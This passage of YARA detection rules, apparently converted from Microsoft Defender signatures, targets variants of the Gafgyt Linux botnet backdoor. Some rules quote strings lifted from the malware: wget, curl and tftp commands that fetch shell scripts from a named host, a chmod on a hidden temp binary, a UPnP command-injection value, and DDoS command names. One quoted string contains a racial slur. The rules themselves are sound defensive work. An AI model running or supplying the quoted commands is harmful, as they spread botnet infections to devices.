        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {d9 4a 1a 3a ec 8a b9 37 e1 2b 1b c8 69 15 26 8b e3 d5 df 20 70 bb d9 31 3c 17 50 cd 67 76 32 f6 f2 9a f3 07 2f cc b5 b7 4a b6 69 8f a1 00 32 ad f4 90 d6 b3 94 87 39 5b 31 d4 ff af e9 6b 8e a7 5d 56 46 99 aa f7 50 3d 27 aa 7b e0 f4 fe 8c f0}  //weight: 1, accuracy: High
        $x_1_2 = {08 8e bf bd 62 7b ec a2 0c 73 3f 37 30 20 ea ce dd 88 06 9e}  //weight: 1, accuracy: High
        $x_1_3 = {1a 03 00 00 68 2a df 69 55 8e 64 30 c7 73 9b 8b 3a 0a 6b 93 e5 06 2d 2c d6 3c 12 98 a9 76 ?? ?? 56 52 c7 34 eb 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Gafgyt_CI_2147822882_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CI!MTB"
        threat_id = "2147822882"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {ec 31 12 51 13 62 14 72 ba 91 ec 31 23 11 60 d1 0b 41 09 00 0d 62 b3 91 ec 31 12 51 04 71 21 21 5d d1 12}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CM_2147824582_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CM!xp"
        threat_id = "2147824582"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 04 24 21 28 40 00 01 00 06 24 7c 83 99 8f 00 00 00 00 09 f8 20 03}  //weight: 1, accuracy: High
        $x_1_2 = {21 28 40 00 20 80 82 8f 00 00 00 00 58 09 59 24 09 f8 20 03}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Gafgyt_CN_2147824583_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CN!xp"
        threat_id = "2147824583"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {34 42 79 b9 00 62 20 26 8f 82 80 18 00 06 18 80 24 42 5a 88 00 62 10 21 ac 44 00 00 8f c2 00 08}  //weight: 1, accuracy: High
        $x_1_2 = {00 24 42 5a 88 ac 43 00 04 8f c3 00 18 3c 02 3c 6e 34 42}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_I_2147824862_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.I!MTB"
        threat_id = "2147824862"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 94 80 00 00 0d c0 a0 e1 00 d8 2d e9 04 b0 4c e2 44 d0 4d e2 44 00 0b e5 48 10 0b e5 4c 20 0b e5 4c 30 1b e5 00 00 53 e3 02 00 00 1a 00 10}  //weight: 1, accuracy: High
        $x_1_2 = {3c 40 81 e5 40 40 81 e5 d8 01 9f e5 1c fb ff eb 35 5c a0 e3 01 3a 8d e2 01 1a 8d e2 38 00 83 e5 34 10 81 e2 08 00 a0 e1 10 20 a0 e3 b6 53 c3 e1 e6 fa ff eb 01 00 70 e3}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Gafgyt_CT_2147825029_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CT!MTB"
        threat_id = "2147825029"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8f c4 00 50 00 60 28 ?? 24 06 00 0a 24 07 00 01 8f 82 80 24 00 00 00 00 24 59 0a d0 03 20 f8 09 00}  //weight: 1, accuracy: Low
        $x_1_2 = {a2 00 18 8f c4 00 50 00 60 ?? ?? 24 06 00 0a 24 07 00 01 8f 82 80 24 00 00 00 00 24 59 0a d0 03 20 f8 09 00 00 00 00 8f dc 00 20 8f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CO_2147825977_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CO!xp"
        threat_id = "2147825977"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 20 8f c4 00 20 8f 85 82 10 8f 99 81 e0 00 00 00 00 03 20 f8 09 00}  //weight: 1, accuracy: High
        $x_1_2 = {00 62 10 21 8c 42 00 00 8f c4 00 30 00 40 28 21 8f 99 83 48 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CP_2147826657_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CP!xp"
        threat_id = "2147826657"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {d8 af be 00 20 03 a0 f0 21 24 03 49 5e 00 00 10 21 af c3}  //weight: 1, accuracy: High
        $x_1_2 = {fe 8f 83 80 18 00 02 20 80 24 62 9b d0 00}  //weight: 1, accuracy: High
        $x_1_3 = {24 42 9b d0 ac 43 00 08 24 02 00 03 af c2 00 08}  //weight: 1, accuracy: High
        $x_1_4 = {9b d0 ac 43 00 04 8f c3 00 18 3c 02 3c 6e 34 42 f3 72 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CR_2147826823_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CR!xp"
        threat_id = "2147826823"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {c1 fa 0f 89 c8 c1 f8 1f 89 d3 29 c3 89 d8 89 45 c0 8b 45 c0}  //weight: 1, accuracy: High
        $x_1_2 = {48 f7 e1 48 89 c8 48 29 d0 48 d1 e8 48 8d 04 02 48 89 c2 48 c1 ea 05}  //weight: 1, accuracy: High
        $x_1_3 = {48 c1 eb 05 48 89 9d 10 fe ff ff 48 8b 85 10 fe ff ff 48 c1 e0 02 48 8d 14 c5 00 00 00 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_V_2147827071_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.V!MTB"
        threat_id = "2147827071"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {00 20 a0 e3 24 30 4b e5 23 20 4b e5 ?? 0d a0 e3 ?? 00 80 e2 ?? ?? 00 eb 00 30 a0 e1 22 30 4b e5 43 34 a0 e1 21 30 4b e5 ?? ?? 9f e5 ?? ?? 00 eb 00 30 a0 e1 20 30 0b e5 24 30 4b e2 14 00 1b e5 03 10 a0 e1 10 20 a0 e3 ?? ?? 00 eb 00 30 a0 e1 10 30 0b e5 10 30 1b e5 01 00 73 e3 02 00 00 1a 14 00 1b e5}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_W_2147827289_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.W!MTB"
        threat_id = "2147827289"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {05 00 1c 3c ?? ?? 9c 27 21 e0 99 03 e0 ff bd 27 1c 00 bf af 18 00 b0 af 10 00 bc af 52 10 02 24 0c 00 00 00 ?? ?? 99 8f 06 00 e0 10 21 80 40 00 09 f8 20 03 00 00 00 00 10 00 bc 8f 00 00 50 ac ff ff 02 24 1c 00 bf 8f 18 00 b0 8f 08 00 e0 03 20 00 bd 27}  //weight: 1, accuracy: Low
        $x_1_2 = {26 10 22 01 27 18 02 00 21 10 4b 00 26 10 43 00 24 10 4a 00 f8 ff 40 10 04 00 84 24 fc ff 82 ?? ff ff 88 24 fc ff 83 24 fd ff 86 24 03 00 45 14 fe ff 87 24 08 00 e0 03 21 10 60 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_X_2147827290_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.X!MTB"
        threat_id = "2147827290"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3c 1c 00 05 27 9c ?? ?? 03 99 e0 21 27 bd ff e0 af bf 00 1c af b0 00 18 af bc 00 10 24 02 10 52 00 00 00 0c 8f 99 ?? ?? 10 e0 00 06 00 40 80 21 03 20 f8 09 00 00 00 00 8f bc 00 10 ac 50 00 00 24 02 ff ff 8f bf 00 1c 8f b0 00 18 03 e0 00 08 27 bd 00 20}  //weight: 1, accuracy: Low
        $x_1_2 = {01 22 10 26 00 02 18 27 00 4b 10 21 00 43 10 26 00 4a 10 24 10 40 ff f8 24 84 00 04 ?? 82 ff fc 24 88 ff ff 24 83 ff fc 24 86 ff fd 14 45 00 03 24 87 ff fe 03 e0 00 08 00 60 10 21}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CW_2147827514_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CW!MTB"
        threat_id = "2147827514"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {bf 00 2c af be 00 28 03 a0 f0 21 af bc 00 10 af c4 00 30 af c0 00 1c 8f c4 00 30 8f 99 81 78 00}  //weight: 1, accuracy: High
        $x_1_2 = {a2 00 18 8f c4 00 50 00 60 28 21 24 06 00 0a 24 07 00 01 8f 82 80 20 00 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CW_2147827514_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CW!MTB"
        threat_id = "2147827514"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {f8 ff 01 24 24 e8 a1 03 e0 ff bd 27 90 83 87 8f 00}  //weight: 1, accuracy: High
        $x_1_2 = {19 00 44 00 12 30 00 00 10 38 00 00 21 28 a7 00 21 38 a0 00 18 80 82 8f 00 00 00 00}  //weight: 1, accuracy: High
        $x_1_3 = {6e 3c 02 3c 72 f3 42 34 21 18 62 00 18 80 82 8f 00 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CR_2147827827_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CR!MTB"
        threat_id = "2147827827"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3b 8c 89 e2 51 8b 18 8b 48 04 83 c1 0c 60 47 e8 d0 04 ?? ?? 89 c6 89 fa f6 5f 6b 6f ?? ?? 89 02 0b 37 30 58 59 5f 5b 56 e7 9d fb f7 ff 52 57 ?? ?? 6a 02 5e 6a 01 5a b9 ee 29 db 68 c0 96 a4 5b 3f}  //weight: 1, accuracy: Low
        $x_1_2 = {05 08 00 74 fd bf b7 ff 0c eb 31 83 c0 04 a3 24 f0 0c ?? d2 a1 06 8b 10 85 d2 75 eb b8 00 ef df 7e db 00 85 c0 1f c7 04 24 64 e9 15 e8 05 7f fb f7 c6 05 34 7d e7 f7 fb 01 c9 c3 8d b6 1e 8d bf 05 55 b8 54 18 77 ff df ff 77 88}  //weight: 1, accuracy: Low
        $x_1_3 = {80 3d e0 e3 05 08 00 74 fd bf b7 ff 0c eb 35 83 c0 04 a3 24 e0 0c ff d2 a1 06 8b 10 85 d2 75 eb b8 00 fe 6f df de 00 85 c0 74 10 2b ?? ?? 04 dc 16 e8 04 7f ?? ?? 83 c4 10 c6 05 2c f6 bd fd 38 01 c9 53 8d b4 26 24 55 2a 54 b9 ff fd 5f 77 88 5a 81 c2 f4 5e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Gafgyt_CQ_2147827831_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CQ!xp"
        threat_id = "2147827831"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {fe 8f 83 80 18 00 02 20 80 24 62 1a ac 00 82 10 21 8c 42}  //weight: 1, accuracy: High
        $x_1_2 = {00 8c 42 0e 88 8f 83 80 18 00 02 20 80 24 62 1a ac 00 82 10 21 8c 44}  //weight: 1, accuracy: High
        $x_1_3 = {00 38 12 00 00 30 10 00 a6 28 21 00 a0 30 21 8f 82 80 18 00}  //weight: 1, accuracy: High
        $x_1_4 = {00 34 af c6 00 38 af c7 00 3c af c0 00 24 24 02 00 20 af c2 00 20 8f c2 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_Y_2147828437_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.Y!MTB"
        threat_id = "2147828437"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {34 42 79 b9 00 62 18 21 8f 82 80 18 00 00 00 00 24 42 2a 60 ac 43 00 04 8f c3 00 18 3c 02 3c 6e 34 42}  //weight: 1, accuracy: High
        $x_1_2 = {34 42 79 b9 00 62 20 26 8f 82 80 18 00 06 18 80 24 42 2a 60 00 62 10 21 ac 44 00 00 8f c2 00 08}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CT_2147828582_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CT!xp"
        threat_id = "2147828582"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 24 42 79 64 af c2 00 40}  //weight: 1, accuracy: High
        $x_1_2 = {00 24 59 0a d0 03 20 f8 09 00}  //weight: 1, accuracy: High
        $x_1_3 = {8f 82 80 20 00 00 00 00 24 59 07 dc 03 20 f8 09 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_JJ_2147829081_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.JJ"
        threat_id = "2147829081"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {37 9e 02 3c b9 79 42 34 21 18 62 00 18 80 82 8f 00 00 00 00 [0-2] 42 24 04 00 43 ac 18 00 c3 8f 6e 3c 02 3c 72 f3 42 34}  //weight: 1, accuracy: Low
        $x_1_2 = {3c 02 9e 37 34 42 79 b9 00 62 18 21 8f 82 80 18 00 00 00 00 24 42 [0-2] ac 43 00 04 8f c3 00 18 3c 02 3c 6e 34 42 f3 72}  //weight: 1, accuracy: Low
        $x_1_3 = {26 18 a2 00 08 00 c2 8f 00 00 00 00 26 18 62 00 37 9e 02 3c b9 79 42 34 26 20 62 00}  //weight: 1, accuracy: High
        $x_1_4 = {00 a2 18 26 8f c2 00 08 00 00 00 00 00 62 18 26 3c 02 9e 37 34 42 79 b9 00 62 20 26}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Gafgyt_CY_2147829084_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CY!MTB"
        threat_id = "2147829084"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {62 18 26 3c 02 9e 37 34 42 79 b9 00 62 20 26 8f 82 80 18 00 06 18 80 24 42 68 c8 00 62 10 21 ac 44 00 00 8f c2 00 08}  //weight: 1, accuracy: High
        $x_1_2 = {bd ff b8 af bf 00 44 af be 00 40 03 a0 f0 21 af bc 00 10 af c4 00 48 af c5 00 4c af c6 00 50 af c7 00 54 af c0 00 30 af c0 00 2c 8f c2 00 4c}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CZ_2147829085_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CZ!MTB"
        threat_id = "2147829085"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {03 99 e0 21 27 bd ff d0 af bf 00 2c af be 00 28 03 a0 f0 21 af bc 00 10 af c4 00 30 af c5 00 34 af c6 00 38 af c7 00 3c af c0 00 24 24 02 00 20 af c2 00 20 8f c2 00 38}  //weight: 1, accuracy: High
        $x_1_2 = {af bf 00 2c af be 00 28 03 a0 f0 21 af bc 00 10 af c4 00 30 af c0 00 1c 8f c4 00 30 8f 99 81 84 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_AC_2147829427_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AC!MTB"
        threat_id = "2147829427"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Killer is on" ascii //weight: 1
        $x_1_2 = "Report Kills is on" ascii //weight: 1
        $x_1_3 = "Locker is on" ascii //weight: 1
        $x_1_4 = "botkill" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_AD_2147829555_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AD!MTB"
        threat_id = "2147829555"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ddoscmds" ascii //weight: 1
        $x_1_2 = "botcount" ascii //weight: 1
        $x_1_3 = "servercmds" ascii //weight: 1
        $x_1_4 = "hbot.botkill" ascii //weight: 1
        $x_1_5 = "killer.txt" ascii //weight: 1
        $x_1_6 = "kickuser" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CS_2147829965_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CS!xp"
        threat_id = "2147829965"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {e2 f0 45 bd e8 1e ff 2f e1 d0 0f 01 00}  //weight: 1, accuracy: High
        $x_1_2 = {3c bf 73 7f dd 4f 15 75 25 78 00}  //weight: 1, accuracy: High
        $x_1_3 = {7f b0 b0 b0 80 74 ce ff 7f b0 b0 b0 80 74 ce}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_CV_2147830792_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.CV!xp"
        threat_id = "2147830792"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8b 45 b4 83 f8 03 76 4c e8 b7 fe ff ff 89 45 f8 c7 45 f4 00 00 00 00 eb 28}  //weight: 1, accuracy: High
        $x_1_2 = {8b 45 f8 88 45 ff c1 6d f8 08 c0 6d ff 03 0f b6 45 ff 48 98}  //weight: 1, accuracy: High
        $x_1_3 = {48 98 0f b6 44 05 d0 89 c2 48 8b 45 c8 88 10 48 ff 45 c8 ff 45 f4}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Gafgyt_BM_2147833474_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BM!MTB"
        threat_id = "2147833474"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "LOCKLUSERS" ascii //weight: 1
        $x_1_2 = "got_nickv2" ascii //weight: 1
        $x_1_3 = "KILLTALEP" ascii //weight: 1
        $x_1_4 = "do_botkill" ascii //weight: 1
        $x_1_5 = "do_send_svstime" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Gafgyt_BN_2147834407_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BN!MTB"
        threat_id = "2147834407"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/bin/busybox chmod 777 /tmp/.amk" ascii //weight: 1
        $x_1_2 = "/var/Sofia" ascii //weight: 1
        $x_1_3 = "tmp/.amk -r /huawei" ascii //weight: 1
        $x_1_4 = "<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BO_2147842153_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BO!MTB"
        threat_id = "2147842153"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "wget http://q.nantibot.eu/bins.sh -O /tmp/bins.sh" ascii //weight: 1
        $x_1_2 = "curl http://q.nantibot.eu/curlBins.sh -O /tmp/curlBins.sh" ascii //weight: 1
        $x_1_3 = "tftp -g -r armv4l q.nantibot.eu" ascii //weight: 1
        $x_1_4 = "/bin/busybox MIRAI" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_DA_2147844119_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.DA!MTB"
        threat_id = "2147844119"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Beans Nigga Bot" ascii //weight: 1
        $x_1_2 = "botkill" ascii //weight: 1
        $x_1_3 = "skidlord" ascii //weight: 1
        $x_1_4 = "PONG" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BG_2147846451_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BG!MTB"
        threat_id = "2147846451"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "self rep netis and nrpe got big dicks lol" ascii //weight: 1
        $x_1_2 = "/etc/xinet.d/" ascii //weight: 1
        $x_1_3 = "TSource Engine Query" ascii //weight: 1
        $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_5 = "31mBoatnet" ascii //weight: 1
        $x_1_6 = "hlLjztqZ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Backdoor_Linux_Gafgyt_DB_2147851287_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.DB!MTB"
        threat_id = "2147851287"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "pkill -f condi" ascii //weight: 1
        $x_1_2 = "udp-plain" ascii //weight: 1
        $x_1_3 = "billybobbot.com/crawler" ascii //weight: 1
        $x_1_4 = "icmp-plain" ascii //weight: 1
        $x_1_5 = "./condi.mips" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_DC_2147904708_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.DC!MTB"
        threat_id = "2147904708"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
